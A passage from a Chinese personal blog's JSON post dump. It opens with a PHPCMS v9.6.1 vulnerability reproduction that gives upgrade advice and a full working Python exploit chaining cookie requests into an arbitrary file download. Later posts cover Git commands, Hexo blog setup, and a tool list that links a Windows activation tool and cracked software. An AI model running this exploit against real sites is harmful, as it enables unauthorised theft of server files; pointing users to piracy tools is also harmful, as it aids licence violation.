http://www.cmsyou.com/support/172.html 0x04 修复建议升级PHPCMS版本到9.6.2或以上。 0x05 PoC Github：https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestsimport reimport sysheaders = &#123;\"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64)\"&#125;def get_cookie1(host): url_1 = host + \"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1\" print(\"[*] 请稍等...正在获取Cookie:\") reponse = requests.get(url_1,headers=headers) try: pattern = r\".*siteid\" #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配 for item in reponse.cookies.keys(): res = re.findall(pattern,item) if res: cookie1 = reponse.cookies.get(res[0]) print(\"[+] 获取到Cookie1:\") print(\"[+] \" + res[0] + \":\" + cookie1) return cookie1 except: print(\"[-] 获取Cookie1失败!\")def get_cookie2(host,cookie1): #该payload实现下载phpcms/modules/content/down.php文件 payload = \"src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C\" #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D\" #payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D\" url_2 = host + \"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;\" + payload data = &#123;\"userid_flash\":cookie1&#125; #将第一次得到的cookie作为\"userid_flash\"的值，并以POST方式提交 reponse = requests.post(url_2,data=data,headers=headers) try: pattern = r\".*att_json\" #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配 for item in reponse.cookies.keys(): res = re.findall(pattern,item) if res: cookie2 = reponse.cookies.get(res[0]) print(\"[+] 获取到Cookie2:\") print(\"[+] \" + res[0] + \":\" + cookie2) return cookie2 except: print(\"[-] 获取Cookie2失败!\")def help(): print(\"-------------------------------------------------------------------------\") print(\" [*] 使用说明：给出index.php之前的部分\") print(\" Usage: python3 phpcmsv9.py http://host:port\") print(\" Example：python3 phpcmsv9.py http://localhost/phpcms\") print(\"-------------------------------------------------------------------------\")if __name__ == \"__main__\": if len(sys.argv) != 2: help() sys.exit(0) host = sys.argv[1].strip() cookie1 = get_cookie1(host) cookie2 = get_cookie2(host,cookie1) if cookie2: print(\"[+] Open link to download file: \") print(\"[+] \" + host + \"/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=\" + cookie2) #最终文件下载连接","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://sakuxa.com/categories/漏洞复现/"}],"tags":[{"name":"PHPCMSv9","slug":"PHPCMSv9","permalink":"https://sakuxa.com/tags/PHPCMSv9/"},{"name":"任意文件下载","slug":"任意文件下载","permalink":"https://sakuxa.com/tags/任意文件下载/"},{"name":"PHP","slug":"PHP","permalink":"https://sakuxa.com/tags/PHP/"}]},{"title":"Git基本命令及使用","slug":"GitNote","date":"2019-02-22T06:04:26.000Z","updated":"2019-05-21T04:20:45.910Z","comments":true,"path":"2019/02/22/GitNote/","link":"","permalink":"https://sakuxa.com/2019/02/22/GitNote/","excerpt":"Git是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。","text":"Git是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。 0x01 Git安装到官网下载安装程序安装即可：https://git-scm.com/ 0x02 基本操作 git init #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。 git status #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本） PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色 git add &lt;filename&gt; #将指定文件加入版本控制。（加入后git status查看红色变为绿色）git add . #将当前目录下的所有文件加入版本控制。 git commit -m “详细描述信息” #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。 git log #版本创建/变更日志。git reflog #同上，但更详细。 可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。 git reset --hard &lt;版本号&gt; #切换状态到指定的版本（快照） git branch #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master git branch &lt;分支名称&gt; #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）git branch -d &lt;分支名称&gt; #删除指定分支 git checkout &lt;分支名称&gt; #进入指定分支 git merge &lt;分支名称&gt; #将指定分支与当前所在分支进行合并。 0x03 连接Github git remote add &lt;github仓库地址别名&gt; &lt;github仓库地址&gt; 别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。 git clone &lt;github项目网址&gt; #克隆下载项目 git pull &lt;github网址别名&gt; &lt;分支名称&gt; #从github拉取指定分支代码。 上面条等价于下面两条：​ git fetch &lt;github网址别名&gt; &lt;分支名称&gt;​ git merge &lt;github网址别名&gt; &lt;分支名称&gt; git push &lt;github网址别名&gt; &lt;分支名称&gt; #将当前所在分支推到github上。 0x04 将某些文件隔离出版本控制 在工作目录下创建.gitignore文件 文件的编写格式内容 123*.sql #表示所有后缀为.sql的文件都被隔离*.pyc #表示所有后缀为.pyc的文件都被隔离a.txt #表示隔离a.txt 教程博客与参考链接 https://www.cnblogs.com/wupeiqi/p/7295372.html http://www.ruanyifeng.com/blog/2018/10/git-internals.html http://www.ruanyifeng.com/blog/2015/12/git-workflow.html http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"必会技能","slug":"必会技能","permalink":"https://sakuxa.com/tags/必会技能/"}]},{"title":"干货杂项收集","slug":"干货杂项收集","date":"2019-02-22T04:55:01.000Z","updated":"2019-06-13T03:22:32.819Z","comments":true,"path":"2019/02/22/干货杂项收集/","link":"","permalink":"https://sakuxa.com/2019/02/22/干货杂项收集/","excerpt":"记录收集的一些有用、有趣的站点或工具软件。 工具全绿色，坚决不用有广告的软件。","text":"记录收集的一些有用、有趣的站点或工具软件。 工具全绿色，坚决不用有广告的软件。 装机必备软件 开源绿色压缩、解压软件：Banzip 简洁干净搜索主页 KIM：https://www.zhuye.kim/ 柠檬搜索：http://www.llemon.cn/ 柴度搜索：https://www.chaidu.com/ 安全导航：https://www.shentoushi.top/ Win2Mac 桌面美化 酷鱼桌面 软媒桌面 upupoo：动态壁纸桌面 + 追番（神器） Wallpaper Engine：Steam平台付费。 PPT等资源 http://www.hippter.com/ 收纳了众多PPT模板等素材的网站。 效率工具 everything：本地文件全局快速搜索。 Snipaste：截图工具 quicker：效率效率。 在线云手机验证码接收，防骚扰 https://sms.cngrok.com/receiving-sms http://www.smszk.com/ https://sms.cm/ 地址大合集：https://bbs.ichunqiu.com/thread-48282-1-1.html 在线工具 全能在线工具：https://www.toolnb.com/ 杂项Misc Typora：Markdown Editor 小书匠：在线Markdown Editor。 LICEcap：gif动图录制工具。 MPic：图床。 IPic：图床。 PicGo：图床。 Win10激活工具：https://www.lanzous.com/b394531 黑苹果：https://www.tonymacx86.com/ 众多破解版软件：http://www.carrotchou.blog/ 壁纸 https://niindo64.com/tag/wallpapers-2/ https://niindo64.com/tag/wallpapers-2/page/2/","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"收集","slug":"收集","permalink":"https://sakuxa.com/tags/收集/"},{"name":"干货","slug":"干货","permalink":"https://sakuxa.com/tags/干货/"}]},{"title":"博客搭建记录 Node.js + Hexo + Yelee + Git Pages","slug":"build-blog","date":"2019-02-21T06:32:04.000Z","updated":"2019-05-21T04:23:50.526Z","comments":true,"path":"2019/02/21/build-blog/","link":"","permalink":"https://sakuxa.com/2019/02/21/build-blog/","excerpt":"本博客采用Node.js + Hexo + Yelee + Git Pages方案。 博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。","text":"本博客采用Node.js + Hexo + Yelee + Git Pages方案。 博客运作的原理是，通过Hexo将写好的Markdown文章渲染为静态网页，然后将静态网页托管到Github上，使用Github的Git Pages来部署博客网站。 0x00 概述博客搭建可分为四部分： Hexo安装及使用 Hexo配置 Hexo联合Git Pages部署 绑定个人域名（可选） 0x01 Hexo安装 Hexo 是一个快速、简洁且高效的博客框架。 Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 1.安装Node.js与Git Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。而Hexo是基于Node.js的，因此在安装Hexo之前要先安装Node.js。直接去官网下载安装程序安装即可。 Git用于进行版本控制。 使用命令node -v及其git version验证node.js与Git是否安装成功，运行命令出现版本即证明成功安装。 2.安装Hexo 安装命令： npm install -g hexo-cli npm是 JavaScript 世界的包管理工具,并且是 Node.js 平台的默认包管理工具。 初始化博客： hexo init myblog //myblog是可以任意取的。 安装依赖： cd myblog //进入这个myblog文件夹npm install //npm会根据目录下的package.json文件安装所需要的依赖。 完成以上操作后，会创建myblog项目目录，目录结构如下(只列举重要的)： public //该文件夹存放的是通过Hexo渲染markdown文章得到的最终静态文件。 scaffolds //该文件夹下存放文章、页面等的模板。 source\\posts //存放Markdown文章，Hexo要渲染的markdown文件就在该目录下。 themes //存放网页主题的目录。 _config.yml //Hexo配置文件。 运行博客： hexo g //等价于hexo generate，用于生成文章。即将posts目录下的Markdown文件渲染为静态文件并保存到public目录下。 hexo s //等价于hexo server，运行博客。运行后会监听在localhost:4000，访问即可看到博客页面。 0x02 Hexo配置修改主题 Hexo拥有众多主题，本博客采用Yelee。 首先到Github上下载或使用git clone将主题下载并放到themes目录下。 然后修改hexo配置文件_config.yml，找到theme:landscape修改为theme:yelee。 关于主题的一些定制化，例如头像等，找到Yelee主题目录下的_config.yml配置文件进行更改。 0x03 Hexo联合Git Pages部署1.关于Git Pages: GitHub Pages 本用于介绍托管在 GitHub 的项目,他会为每个用户免费分配一个github.io域的域名。使用该域名可以访问同名的代码仓库。 2.Git Pages配置 首先，注册并拥有Github账号。 然后，创建一个新的代码仓库。并使用xxx.github.io作为仓库名字。 然后，配置Hexo的部署方式为Git。找到Hexo配置文件_config.yml ，修改deploy: 123deploy: type: git repo: https://github.com/sh4douu/sh4douu.github.io.git #这里是上一步创建的仓库连接。 3.部署hexo到git pages： 执行部署命令前，先安装用于部署的插件：npm install hexo-deployer-git --save 执行部署：hexo d //等同于hexo deploy 所谓的部署，即将hexo用于存放渲染完毕的静态文件的public目录push到刚才在github创建的仓库。 然后通过Git Pages分配的域名，实现博客网站的部署访问。 4.Hexo写博客的流程 首先，编写Markdown文章。使用hexo new &quot;title&quot;命令，该命令会以scaffolds目录下的post.md作为文章模板在source\\posts目录下生成title.md。编写该markdown文件即可。 编写完成后，要将markdown文件渲染生成静态文件。执行命令：hexo g。执行该命令后，会在public目录下生成渲染完毕的静态文件。 最后，将生成的静态文件push到github上进行部署。使用命令：hexo d。 可能会因为缓存等原因造成某些问题，可以使用命令hexo clean进行清扫。该命令会清除掉所有已渲染的文件及其缓存。清除后再重新生成、部署。 0x04 绑定个人域名Git Pages分配的域名是xxx.github.io样式的，若想要使用自己的域名，可通过CNAME解析实现。 首先，注册购买域名，如：sakuxa.com。 然后设置解析，添加一条CNAME记录即可： 然后在source目录下创建一个文件，名称为CNAME，文件无后缀。文件的内容写入域名，如：sakuxa.com 然后再到Github上，找到前面创建的仓库的settings，进入并找到自定义域名输入框填入自己的域名即可： 参考连接 https://blog.csdn.net/sinat_37781304/article/details/82729029 https://github.com/MOxFIVE/hexo-theme-yelee","categories":[{"name":"Misc","slug":"Misc","permalink":"https://sakuxa.com/categories/Misc/"}],"tags":[{"name":"技术","slug":"技术","permalink":"https://sakuxa.com/tags/技术/"},{"name":"环境搭建","slug":"环境搭建","permalink":"https://sakuxa.com/tags/环境搭建/"}]}]}